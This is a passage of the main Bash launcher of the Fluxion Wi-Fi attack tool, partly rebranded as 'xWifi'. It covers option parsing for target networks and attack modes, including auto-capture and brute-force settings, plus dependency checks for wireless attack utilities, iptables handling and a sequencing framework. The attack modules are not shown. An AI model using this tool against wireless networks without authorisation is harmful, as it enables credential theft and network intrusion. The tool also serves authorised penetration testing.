#!/usr/bin/env bash

# ============================================================ #
# ================== < FLUXION Parameters > ================== #
# ============================================================ #
# Path to directory containing the FLUXION executable script.
readonly FLUXIONPath=$(dirname $(readlink -f "$0"))

# Path to directory containing the FLUXION library (scripts).
readonly FLUXIONLibPath="$FLUXIONPath/lib"

# Path to the temp. directory available to FLUXION & subscripts.
readonly FLUXIONWorkspacePath="/tmp/fluxspace"
readonly FLUXIONIPTablesBackup="$FLUXIONPath/iptables-rules"

# Path to FLUXION's preferences file, to be loaded afterward.
readonly FLUXIONPreferencesFile="$FLUXIONPath/preferences/preferences.conf"

# Constants denoting the reference noise floor & ceiling levels.
# These are used by the the wireless network scanner visualizer.
readonly FLUXIONNoiseFloor=-90
readonly FLUXIONNoiseCeiling=-60

readonly FLUXIONVersion=6
readonly FLUXIONRevision=16

# Declare window ration bigger = smaller windows
FLUXIONWindowRatio=4

# Allow to skip dependencies if required, not recommended
FLUXIONSkipDependencies=1

# Check if there are any missing dependencies
FLUXIONMissingDependencies=0

# Allow to use 5ghz support
FLUXIONEnable5GHZ=0

# ============================================================ #
# ================= < Script Sanity Checks > ================= #
# ============================================================ #
if [ $EUID -ne 0 ]; then # Super User Check
  echo -e "\\033[31mAborted, please execute the script as root.\\033[0m"; exit 1
fi

# ===================== < XTerm Checks > ===================== #
# TODO: Run the checks below only if we're not using tmux.
if [ ! "${DISPLAY:-}" ]; then # Assure display is available.
  echo -e "\\033[31mAborted, X (graphical) session unavailable.\\033[0m"; exit 2
fi

if ! hash xdpyinfo 2>/dev/null; then # Assure display probe.
  echo -e "\\033[31mAborted, xdpyinfo is unavailable.\\033[0m"; exit 3
fi

if ! xdpyinfo &>/dev/null; then # Assure display info available.
  echo -e "\\033[31mAborted, xterm test session failed.\\033[0m"; exit 4
fi

# ================ < Parameter Parser Check > ================ #
getopt --test > /dev/null # Assure enhanced getopt (returns 4).
if [ $? -ne 4 ]; then
  echo "\\033[31mAborted, enhanced getopt isn't available.\\033[0m"; exit 5
fi

# =============== < Working Directory Check > ================ #
if ! mkdir -p "$FLUXIONWorkspacePath" &> /dev/null; then
  echo "\\033[31mAborted, can't generate a workspace directory.\\033[0m"; exit 6
fi

# Once sanity check is passed, we can start to load everything.

# ============================================================ #
# =================== < Library Includes > =================== #
# ============================================================ #
source "$FLUXIONLibPath/installer/InstallerUtils.sh"
source "$FLUXIONLibPath/InterfaceUtils.sh"
source "$FLUXIONLibPath/SandboxUtils.sh"
source "$FLUXIONLibPath/FormatUtils.sh"
source "$FLUXIONLibPath/ColorUtils.sh"
source "$FLUXIONLibPath/IOUtils.sh"
source "$FLUXIONLibPath/HashUtils.sh"
source "$FLUXIONLibPath/HelpUtils.sh"

# NOTE: These are configured after arguments are loaded (later).

# ============================================================ #
# =================== < Parse Parameters > =================== #
# ============================================================ #
if ! FLUXIONCLIArguments=$(
    getopt --options="vdk5rinmthb:e:c:l:a:r" \
      --longoptions="debug,debug-log:,version,killer,5ghz,installer,reloader,help,airmon-ng,multiplexer,target,test,auto,bssid:,essid:,channel:,language:,attack:,ratio,skip-dependencies,auto-capture,auto-bruteforce,wordlist-type:,password-length:,smart" \
      --name="xWifi V$FLUXIONVersion.$FLUXIONRevision" -- "$@"
  ); then
  echo -e "${CRed}Aborted$CClr, parameter error detected..."; exit 5
fi

AttackCLIArguments=${FLUXIONCLIArguments##* -- }
readonly FLUXIONCLIArguments=${FLUXIONCLIArguments%%-- *}
if [ "$AttackCLIArguments" = "$FLUXIONCLIArguments" ]; then
  AttackCLIArguments=""
fi


# ============================================================ #
# ================== < Load Configurables > ================== #
# ============================================================ #

# ============= < Argument Loaded Configurables > ============ #
eval set -- "$FLUXIONCLIArguments" # Set environment parameters.

#[ "$1" != "--" ] && readonly FLUXIONAuto=1 # Auto-mode if using CLI.
while [ "$1" != "" ] && [ "$1" != "--" ]; do
  case "$1" in
    -v|--version) echo "xWifi V$FLUXIONVersion.$FLUXIONRevision by AIFlowHub"; exit;;
    -h|--help) fluxion_help; exit;;
    -d|--debug) readonly FLUXIONDebug=1;;
    --debug-log) FLUXIONDebugLog="$2"; shift;;
    -k|--killer) readonly FLUXIONWIKillProcesses=1;;
    -5|--5ghz) FLUXIONEnable5GHZ=1;;
    -r|--reloader) readonly FLUXIONWIReloadDriver=1;;
    -n|--airmon-ng) readonly FLUXIONAirmonNG=1;;
    -m|--multiplexer) readonly FLUXIONTMux=1;;
    -b|--bssid) FluxionTargetMAC=$2; shift;;
    -e|--essid) FluxionTargetSSID=$2;
      # TODO: Rearrange declarations to have routines available for use here.
      FluxionTargetSSIDClean=$(echo "$FluxionTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g'); shift;;
    -c|--channel) FluxionTargetChannel=$2; shift;;
    -l|--language) FluxionLanguage=$2; shift;;
    -a|--attack) FluxionAttack=$2; shift;;
    -i|--install) FLUXIONSkipDependencies=0; shift;;
    --ratio) FLUXIONWindowRatio=$2; shift;;
    --auto) readonly FLUXIONAuto=1;;
    --auto-capture) readonly FLUXIONAutoCapture=1; readonly FLUXIONAuto=1;;
    --auto-bruteforce) readonly FLUXIONAutoBruteforce=1;;
    --wordlist-type) FLUXIONWordlistType=$2; shift;;
    --password-length) FLUXIONPasswordLength=$2; shift;;
    --smart) readonly FLUXIONSmartMode=1; readonly FLUXIONAutoCapture=1; readonly FLUXIONAutoBruteforce=1; readonly FLUXIONAuto=1;;
    --skip-dependencies) readonly FLUXIONSkipDependencies=1;;
  esac
  shift # Shift new parameters
done

shift # Remove "--" to prepare for attacks to read parameters.
# Executable arguments are handled after subroutine definition.

# =================== < User Preferences > =================== #
# Load user-defined preferences if there's an executable script.
# If no script exists, prepare one for the user to store config.
# WARNING: Preferences file must assure no redeclared constants.
if [ -x "$FLUXIONPreferencesFile" ]; then
  source "$FLUXIONPreferencesFile"
else
  echo '#!/usr/bin/env bash' > "$FLUXIONPreferencesFile"
  chmod u+x "$FLUXIONPreferencesFile"
fi

# ================ < Configurable Constants > ================ #
if [ "$FLUXIONAuto" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONAuto=${FLUXIONAuto:+1}
fi

if [ "$FLUXIONDebug" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONDebug=${FLUXIONDebug:+1}
fi

if [ "$FLUXIONAirmonNG" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONAirmonNG=${FLUXIONAirmonNG:+1}
fi

if [ "$FLUXIONWIKillProcesses" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONWIKillProcesses=${FLUXIONWIKillProcesses:+1}
fi

if [ "$FLUXIONWIReloadDriver" != "1" ]; then # If defined, assure 1.
  readonly FLUXIONWIReloadDriver=${FLUXIONWIReloadDriver:+1}
fi

# FLUXIONDebug [Normal Mode "" / Developer Mode 1]
if [ $FLUXIONDebug ]; then
  # Use custom debug log path if specified, otherwise default to /tmp
  if [ -z "$FLUXIONDebugLog" ]; then
    FLUXIONDebugLog="/tmp/fluxion.debug.log"
  fi
  :> "$FLUXIONDebugLog"
  readonly FLUXIONOutputDevice="$FLUXIONDebugLog"
  readonly FLUXIONHoldXterm="-hold"
  echo "Debug log: $FLUXIONDebugLog"
else
  readonly FLUXIONOutputDevice=/dev/null
  readonly FLUXIONHoldXterm=""
fi

# ================ < Configurable Variables > ================ #
readonly FLUXIONPromptDefault="$CRed[${CSBlu}fluxion$CSYel@$CSWht$HOSTNAME$CClr$CRed]-[$CSYel~$CClr$CRed]$CClr "
FLUXIONPrompt=$FLUXIONPromptDefault

readonly FLUXIONVLineDefault="$CRed[$CSYel*$CClr$CRed]$CClr"
FLUXIONVLine=$FLUXIONVLineDefault

# ================== < Library Parameters > ================== #
readonly InterfaceUtilsOutputDevice="$FLUXIONOutputDevice"

readonly SandboxWorkspacePath="$FLUXIONWorkspacePath"
readonly SandboxOutputDevice="$FLUXIONOutputDevice"

readonly InstallerUtilsWorkspacePath="$FLUXIONWorkspacePath"
readonly InstallerUtilsOutputDevice="$FLUXIONOutputDevice"
readonly InstallerUtilsNoticeMark="$FLUXIONVLine"

readonly PackageManagerLog="$InstallerUtilsWorkspacePath/package_manager.log"

declare  IOUtilsHeader="fluxion_header"
readonly IOUtilsQueryMark="$FLUXIONVLine"
readonly IOUtilsPrompt="$FLUXIONPrompt"

readonly HashOutputDevice="$FLUXIONOutputDevice"

# ============================================================ #
# =================== < Default Language > =================== #
# ============================================================ #
# Set by default in case fluxion is aborted before setting one.
source "$FLUXIONPath/language/en.sh"

# ============================================================ #
# ================== < Startup & Shutdown > ================== #
# ============================================================ #
fluxion_startup() {
  if [ "$FLUXIONDebug" ]; then return 1; fi

  # Make sure that we save the iptable files
  iptables-save >"$FLUXIONIPTablesBackup"
  local banner=()

  format_center_literals \
    " ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    " ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘"
  banner+=("$FormatCenterLiterals")
  format_center_literals \
    "¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯"
  banner+=("$FormatCenterLiterals")

  clear

  if [ "$FLUXIONAuto" ]; then echo -e "$CBlu"; else echo -e "$CRed"; fi

  for line in "${banner[@]}"; do
    echo "$line"; sleep 0.05
  done

  echo # Do not remove.

  sleep 0.1
  local -r fluxionRepository="https://github.com/FluxionNetwork/fluxion"
  format_center_literals "${CGrn}Site: ${CRed}$fluxionRepository$CClr"
  echo -e "$FormatCenterLiterals"

  sleep 0.1
  local -r versionInfo="${CSRed}FLUXION $FLUXIONVersion$CClr"
  local -r revisionInfo="(rev. $CSBlu$FLUXIONRevision$CClr)"
  local -r credits="by$CCyn FluxionNetwork$CClr"
  format_center_literals "$versionInfo $revisionInfo $credits"
  echo -e "$FormatCenterLiterals"

  sleep 0.1
  local -r fluxionDomain="raw.githubusercontent.com"
  local -r fluxionPath="FluxionNetwork/fluxion/master/fluxion.sh"
  local -r updateDomain="github.com"
  local -r updatePath="FluxionNetwork/fluxion/archive/master.zip"
  if installer_utils_check_update "https://$fluxionDomain/$fluxionPath" \
    "FLUXIONVersion=" "FLUXIONRevision=" \
    $FLUXIONVersion $FLUXIONRevision; then
    if installer_utils_run_update "https://$updateDomain/$updatePath" \
      "FLUXION-V$FLUXIONVersion.$FLUXIONRevision" "$FLUXIONPath"; then
      fluxion_shutdown
    fi
  fi

  echo # Do not remove.

  local requiredCLITools=(
    "aircrack-ng" "bc" "awk:awk|gawk|mawk"
    "curl" "cowpatty" "dhcpd:isc-dhcp-server|dhcp-server|dhcp" "7zr:7zip-reduced|p7zip" "hostapd" "lighttpd"
    "iw" "macchanger" "mdk4" "dsniff" "nmap" "openssl"
    "php-cgi" "xterm" "rfkill" "unzip" "route:net-tools"
    "fuser:psmisc" "killall:psmisc" "crunch"
  )

    while ! installer_utils_check_dependencies requiredCLITools[@]; do
        if ! installer_utils_run_dependencies InstallerUtilsCheckDependencies[@]; then
            echo
            echo -e "${CRed}Dependency installation failed!$CClr"
            echo    "Press enter to retry, ctrl+c to exit..."
            read -r bullshit
        fi
    done
    if [ $FLUXIONMissingDependencies -eq 1 ]  && [ $FLUXIONSkipDependencies -eq 1 ];then
        echo -e "\n\n"
        format_center_literals "[ ${CSRed}Missing dependencies: try to install using ./fluxion.sh -i${CClr} ]"
        echo -e "$FormatCenterLiterals"; sleep 3

        exit 7
    fi

  echo -e "\\n\\n" # This echo is for spacing
}

fluxion_shutdown() {
  if [ $FLUXIONDebug ]; then return 1; fi

  # Show the header if the subroutine has already been loaded.
  if type -t fluxion_header &> /dev/null; then
    fluxion_header
  fi

  echo -e "$CWht[$CRed-$CWht]$CRed $FLUXIONCleanupAndClosingNotice$CClr"

  # Get running processes we might have to kill before exiting.
  local processes
  readarray processes < <(ps -A)

  # Currently, fluxion is only responsible for killing airodump-ng, since
  # fluxion explicitly uses it to scan for candidate target access points.
  # NOTICE: Processes started by subscripts, such as an attack script,
  # MUST BE TERMINATED BY THAT SCRIPT in the subscript's abort handler.
  local -r targets=("airodump-ng")

  local targetID # Program identifier/title
  for targetID in "${targets[@]}"; do
    # Get PIDs of all programs matching targetPID
    local targetPID
    targetPID=$(
      echo "${processes[@]}" | awk '$4~/'"$targetID"'/{print $1}'
    )
    if [ ! "$targetPID" ]; then continue; fi
    echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $FLUXIONKillingProcessNotice`"
    kill -s SIGKILL $targetPID &> $FLUXIONOutputDevice
  done
  kill -s SIGKILL $authService &> $FLUXIONOutputDevice

  # Assure changes are reverted if installer was activated.
  if [ "$PackageManagerCLT" ]; then
    echo -e "$CWht[$CRed-$CWht] "$(
      io_dynamic_output "$FLUXIONRestoringPackageManagerNotice"
    )"$CClr"
    # Notice: The package manager has already been restored at this point.
    # InstallerUtils assures the manager is restored after running operations.
  fi

  # If allocated interfaces exist, deallocate them now.
  if [ ${#FluxionInterfaces[@]} -gt 0 ]; then
    local interface
    for interface in "${!FluxionInterfaces[@]}"; do
      # Only deallocate fluxion or airmon-ng created interfaces.
      if [[ "$interface" == "flux"* || "$interface" == *"mon"* || "$interface" == "prism"* ]]; then
        fluxion_deallocate_interface "$interface"
      fi
    done
  fi

  echo -e "$CWht[$CRed-$CWht] $FLUXIONDisablingCleaningIPTablesNotice$CClr"
  if [ -f "$FLUXIONIPTablesBackup" ]; then
    iptables-restore <"$FLUXIONIPTablesBackup" \
      &> $FLUXIONOutputDevice
    rm -f "$FLUXIONIPTablesBackup"
  else
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
  fi

  echo -e "$CWht[$CRed-$CWht] $FLUXIONRestoringTputNotice$CClr"
  tput cnorm

  if [ ! $FLUXIONDebug ]; then
    echo -e "$CWht[$CRed-$CWht] $FLUXIONDeletingFilesNotice$CClr"
    sandbox_remove_workfile "$FLUXIONWorkspacePath/*"
  fi

  if [ $FLUXIONWIKillProcesses ]; then
    echo -e "$CWht[$CRed-$CWht] $FLUXIONRestartingNetworkManagerNotice$CClr"

    # TODO: Add support for other network managers (wpa_supplicant?).
    if [ ! -x "$(command -v systemctl)" ]; then
        if [ -x "$(command -v service)" ];then
        service network-manager restart &> $FLUXIONOutputDevice &
        service networkmanager restart &> $FLUXIONOutputDevice &
        service networking restart &> $FLUXIONOutputDevice &
      fi
    else
      systemctl restart network-manager.service &> $FLUXIONOutputDevice &
    fi
  fi

  echo -e "$CWht[$CGrn+$CWht] $CGrn$FLUXIONCleanupSuccessNotice$CClr"
  echo -e "$CWht[$CGrn+$CWht] $CGry$FLUXIONThanksSupportersNotice$CClr"

  sleep 3

  clear

  exit 0
}


# ============================================================ #
# ================== < Helper Subroutines > ================== #
# ============================================================ #
# The following will kill the parent proces & all its children.
fluxion_kill_lineage() {
  if [ ${#@} -lt 1 ]; then return -1; fi

  if [ ! -z "$2" ]; then
    local -r options=$1
    local match=$2
  else
    local -r options=""
    local match=$1
  fi

  # Check if the match isn't a number, but a regular expression.
  # The following might
  if ! [[ "$match" =~ ^[0-9]+$ ]]; then
    match=$(pgrep -f $match 2> $FLUXIONOutputDevice)
  fi

  # Check if we've got something to kill, abort otherwise.
  if [ -z "$match" ]; then return -2; fi

  kill $options $(pgrep -P $match 2> $FLUXIONOutputDevice) \
    &> $FLUXIONOutputDevice
  kill $options $match &> $FLUXIONOutputDevice
}


# ============================================================ #
# ================= < Handler Subroutines > ================== #
# ============================================================ #
# Delete log only in Normal Mode !
fluxion_conditional_clear() {
  # Clear if we're not in debug mode
  if [ ! $FLUXIONDebug ]; then clear; fi
}

fluxion_conditional_bail() {
  echo ${1:-"Something went wrong, whoops! (report this)"}
  sleep 5
  if [ ! $FLUXIONDebug ]; then
    fluxion_handle_exit
    return 1
  fi
  echo "Press any key to continue execution..."
  read -r bullshit
}

# ERROR Report only in Developer Mode
if [ $FLUXIONDebug ]; then
  fluxion_error_report() {
    echo "Exception caught @ line #$1"
  }

  trap 'fluxion_error_report $LINENO' ERR
fi

fluxion_handle_abort_attack() {
  if [ $(type -t stop_attack) ]; then
    stop_attack &> $FLUXIONOutputDevice
    unprep_attack &> $FLUXIONOutputDevice
  else
    echo "Attack undefined, can't stop anything..." > $FLUXIONOutputDevice
  fi

  fluxion_target_tracker_stop
}

# In case of abort signal, abort any attacks currently running.
trap fluxion_handle_abort_attack SIGABRT

fluxion_handle_exit() {
  fluxion_handle_abort_attack
  fluxion_shutdown
  exit 1
}

# In case of unexpected termination, run fluxion_shutdown.
trap fluxion_handle_exit SIGINT SIGHUP


fluxion_handle_target_change() {
  echo "Target change signal received!" > $FLUXIONOutputDevice

  local targetInfo
  readarray -t targetInfo < <(more "$FLUXIONWorkspacePath/target_info.txt")

  FluxionTargetMAC=${targetInfo[0]}
  FluxionTargetSSID=${targetInfo[1]}
  FluxionTargetChannel=${targetInfo[2]}

  FluxionTargetSSIDClean=$(fluxion_target_normalize_SSID)

  if ! stop_attack; then
    fluxion_conditional_bail "Target tracker failed to stop attack."
  fi

  if ! unprep_attack; then
    fluxion_conditional_bail "Target tracker failed to unprep attack."
  fi

  if ! load_attack "$FLUXIONPath/attacks/$FluxionAttack/attack.conf"; then
    fluxion_conditional_bail "Target tracker failed to load attack."
  fi

  if ! prep_attack; then
    fluxion_conditional_bail "Target tracker failed to prep attack."
  fi

  # Restart attack services and tracker without blocking on user input.
  # NOTE: Do NOT call fluxion_run_attack here as it blocks on io_query_choice.
  start_attack
  fluxion_target_tracker_start
}

# If target monitoring enabled, act on changes.
trap fluxion_handle_target_change SIGALRM


# ============================================================ #
# =============== < Resolution & Positioning > =============== #
# ============================================================ #
fluxion_set_resolution() { # Windows + Resolution

  # Get dimensions
  # Verify this works on Kali before commiting.
  # shopt -s checkwinsize; (:;:)
  # SCREEN_SIZE_X="$LINES"
  # SCREEN_SIZE_Y="$COLUMNS"

  SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
  SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
  SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))

  # Calculate proportional windows
  if hash bc ;then
    PROPOTION=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$SCREEN_SIZE_Y}")/1 | bc)
    NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$FLUXIONWindowRatio}")/1 | bc)
    NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/$FLUXIONWindowRatio}")/1 | bc)

    NEW_SCREEN_SIZE_BIG_X=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_X/$FLUXIONWindowRatio}")/1 | bc)
    NEW_SCREEN_SIZE_BIG_Y=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_Y/$FLUXIONWindowRatio}")/1 | bc)

    SCREEN_SIZE_MID_X=$(echo $(($SCREEN_SIZE_X + ($SCREEN_SIZE_X - 2 * $NEW_SCREEN_SIZE_X) / 2)))
    SCREEN_SIZE_MID_Y=$(echo $(($SCREEN_SIZE_Y + ($SCREEN_SIZE_Y - 2 * $NEW_SCREEN_SIZE_Y) / 2)))

    # Upper windows
    TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
    TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
    TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"

    # Lower windows
    BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
    BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
    BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"

    # Y mid
    LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
    RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"

    # Big
    TOPLEFTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y+0+0"
    TOPRIGHTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y-0+0"
  fi
}


# ============================================================ #
# ================= < Sequencing Framework > ================= #
# ============================================================ #
# The following lists some problems with the framework's design.
# The list below is a list of DESIGN FLAWS, not framework bugs.
# * Sequenced undo instructions' return value is being ignored.
# * A global is generated for every new namespace being used.
# * It uses eval too much, but it's bash, so that's not so bad.
# TODO: Try to fix this or come up with a better alternative.
declare -rA FLUXIONUndoable=( \
  ["set"]="unset" \
  ["prep"]="unprep" \
  ["run"]="halt" \
  ["start"]="stop" \
)

# Yes, I know, the identifiers are fucking ugly. If only we had
# some type of mangling with bash identifiers, that'd be great.
fluxion_do() {
  if [ ${#@} -lt 2 ]; then return -1; fi

  local -r __fluxion_do__namespace=$1
  local -r __fluxion_do__identifier=$2

  echo ">>> CALLING: ${__fluxion_do__namespace}_$__fluxion_do__identifier" >> "$FLUXIONOutputDevice"
  # Notice, the instruction will be adde to the Do Log
  # regardless of whether it succeeded or failed to execute.
  eval FXDLog_$__fluxion_do__namespace+=\("$__fluxion_do__identifier"\)
  echo ">>> ABOUT TO EVAL: ${__fluxion_do__namespace}_$__fluxion_do__identifier" >> "$FLUXIONOutputDevice"
  eval ${__fluxion_do__namespace}_$__fluxion_do__identifier "${@:3}"
  local result=$?
  echo ">>> RESULT: $result" >> "$FLUXIONOutputDevice"
  return $result
}

fluxion_undo() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __fluxion_undo__namespace=$1

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  eval local __fluxion_undo__history=\("\${FXDLog_$__fluxion_undo__namespace[@]}"\)

  eval echo \$\{FXDLog_$__fluxion_undo__namespace[@]\} \
    > $FLUXIONOutputDevice

  local __fluxion_undo__i
  for (( __fluxion_undo__i=${#__fluxion_undo__history[@]}; \
    __fluxion_undo__i > 0; __fluxion_undo__i-- )); do
    local __fluxion_undo__instruction=${__fluxion_undo__history[__fluxion_undo__i-1]}
    local __fluxion_undo__command=${__fluxion_undo__instruction%%_*}
    local __fluxion_undo__identifier=${__fluxion_undo__instruction#*_}

    echo "Do ${FLUXIONUndoable["$__fluxion_undo__command"]}_$__fluxion_undo__identifier" \
      > $FLUXIONOutputDevice
    if eval ${__fluxion_undo__namespace}_${FLUXIONUndoable["$__fluxion_undo__command"]}_$__fluxion_undo__identifier; then
      echo "Undo-chain succeded." > $FLUXIONOutputDevice
      eval FXDLog_$__fluxion_undo__namespace=\("${__fluxion_undo__history[@]::$__fluxion_undo__i}"\)
      eval echo History\: \$\{FXDLog_$__fluxion_undo__namespace[@]\} \
        > $FLUXIONOutputDevice
      return 0
    fi
  done

  return -2 # The undo-chain failed.
}

fluxion_done() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __fluxion_done__namespace=$1

  eval "FluxionDone=\${FXDLog_$__fluxion_done__namespace[-1]}"

  if [ ! "$FluxionDone" ]; then return 1; fi
}

fluxion_done_reset() {
  if [ ${#@} -ne 1 ]; then return -1; fi

  local -r __fluxion_done_reset__namespace=$1

  eval FXDLog_$__fluxion_done_reset__namespace=\(\)
}

fluxion_do_sequence() {
  if [ ${#@} -ne 2 ]; then return 1; fi

  # TODO: Implement an alternative, better method of doing
  # what this subroutine does, maybe using for-loop iteFLUXIONWindowRation.
  # The for-loop implementation must support the subroutines
  # defined above, including updating the namespace tracker.

  local -r __fluxion_do_sequence__namespace=$1

  # Removed read-only due to local constant shadowing bug.
  # I've reported the bug, we can add it when fixed.
  local __fluxion_do_sequence__sequence=("${!2}")

  if [ ${#__fluxion_do_sequence__sequence[@]} -eq 0 ]; then
    return -2
  fi

  local -A __fluxion_do_sequence__index=()

  local i
  for i in $(seq 0 $((${#__fluxion_do_sequence__sequence[@]} - 1))); do
    __fluxion_do_sequence__index["${__fluxion_do_sequence__sequence[i]}"]=$i
  done

  # Start sequence with the first instruction available.
  local __fluxion_do_sequence__instructionIndex=0
  local __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[0]}
  echo "SEQUENCE: ${__fluxion_do_sequence__sequence[@]}" >> "$FLUXIONOutputDevice"
  while [ "$__fluxion_do_sequence__instruction" ]; do
    echo "INDEX=$__fluxion_do_sequence__instructionIndex INSTRUCTION=$__fluxion_do_sequence__instruction" >> "$FLUXIONOutputDevice"
    if ! fluxion_do $__fluxion_do_sequence__namespace $__fluxion_do_sequence__instruction; then
      if ! fluxion_undo $__fluxion_do_sequence__namespace; then
        return -2
      fi

      # Synchronize the current instruction's index by checking last.
      if ! fluxion_done $__fluxion_do_sequence__namespace; then
        return -3;
      fi

      __fluxion_do_sequence__instructionIndex=${__fluxion_do_sequence__index["$FluxionDone"]}

      if [ ! "$__fluxion_do_sequence__instructionIndex" ]; then
        return -4
      fi
    else
      let __fluxion_do_sequence__instructionIndex++
    fi

    __fluxion_do_sequence__instruction=${__fluxion_do_sequence__sequence[$__fluxion_do_sequence__instructionIndex]}
    echo "Running next: $__fluxion_do_sequence__instruction" \
      >> $FLUXIONOutputDevice
  done
}


# ============================================================ #
# ================= < Load All Subroutines > ================= #
# ============================================================ #
fluxion_header() {
  format_apply_autosize "[%*s]\n"
  local verticalBorder=$FormatApplyAutosize

  format_apply_autosize "[%*s${CSRed}xWifi $FLUXIONVersion${CSWht}.${CSBlu}$FLUXIONRevision$CSRed    <$CIRed x${CIYel}Wifi$CIRed by$CIYel AIFlow${CIRed}Hub$CClr$CSYel >%*s$CSBlu]\n"
  local headerTextFormat="$FormatApplyAutosize"

  fluxion_conditional_clear

  echo -e "$(printf "$CSRed$verticalBorder" "" | sed -r "s/ /~/g")"
  printf "$CSRed$verticalBorder" ""
  printf "$headerTextFormat" "" ""
  printf "$CSBlu$verticalBorder" ""
  echo -e "$(printf "$CSBlu$verticalBorder" "" | sed -r "s/ /~/g")$CClr"
  echo
  echo
}

# ======================= < Language > ======================= #
fluxion_unset_language() {
  FluxionLanguage=""

  if [ "$FLUXIONPreferencesFile" ]; then
    sed -i.backup "/FluxionLanguage=.\+/ d" "$FLUXIONPreferencesFile"
  fi
}

fluxion_set_language() {
  if [ ! "$FluxionLanguage" ]; then
    # Get all languages available.
    local languageCodes
    readarray -t languageCodes < <(ls -1 language | sed -E 's/\.sh//')

    local languages
    readarray -t languages < <(
      head -n 3 language/*.sh |
      grep -E "^# native: " |
      sed -E 's/# \w+: //'
    )

    # Prepare choices array for io_query_choice
    local choices=()
    for i in "${!languageCodes[@]}"; do
      choices+=("${languageCodes[i]} / ${languages[i]}")
    done
    choices+=("Exit")

    io_query_choice "$FLUXIONVLine Select your language" choices[@]
    
    # Handle exit selection
    if [ "$IOQueryChoice" = "Exit" ]; then
      fluxion_handle_exit
    fi
    
    # Extract language code from selection (format: "code / name")
    FluxionLanguage=$(echo "$IOQueryChoice" | cut -d ' ' -f 1)

    echo # Do not remove.
  fi

  # Check if all language files are present for the selected language.
  find -type d -name language | while read language_dir; do
    if [ ! -e "$language_dir/${FluxionLanguage}.sh" ]; then
      echo -e "$FLUXIONVLine ${CYel}Warning${CClr}, missing language file:"
      echo -e "\t$language_dir/${FluxionLanguage}.sh"
      return 1
    fi
  done

  if [ $? -eq 1 ]; then # If a file is missing, fall back to english.
    echo -e "\n\n$FLUXIONVLine Falling back to English..."; sleep 5
    FluxionLanguage="en"
  fi

  source "$FLUXIONPath/language/$FluxionLanguage.sh"

  if [ "$FLUXIONPreferencesFile" ]; then
    if more $FLUXIONPreferencesFile | \
      grep -q "FluxionLanguage=.\+" &> /dev/null; then
      sed -r "s/FluxionLanguage=.+/FluxionLanguage=$FluxionLanguage/g" \
      -i.backup "$FLUXIONPreferencesFile"
    else
      echo "FluxionLanguage=$FluxionLanguage" >> "$FLUXIONPreferencesFile"
    fi
  fi
}

# ====================== < Interfaces > ====================== #
declare -A FluxionInterfaces=() # Global interfaces' registry.

fluxion_deallocate_interface() { # Release interfaces
  if [ ! "$1" ]; then return 1; fi
  if ! interface_is_real "$1"; then return 1; fi

  local -r oldIdentifier=$1
  local -r newIdentifier=${FluxionInterfaces[$oldIdentifier]}

  # Assure the interface is in the allocation table.
  if [ ! "$newIdentifier" ]; then return 2; fi

  local interfaceIdentifier=$newIdentifier
  echo -e "$CWht[$CSRed-$CWht] "$(
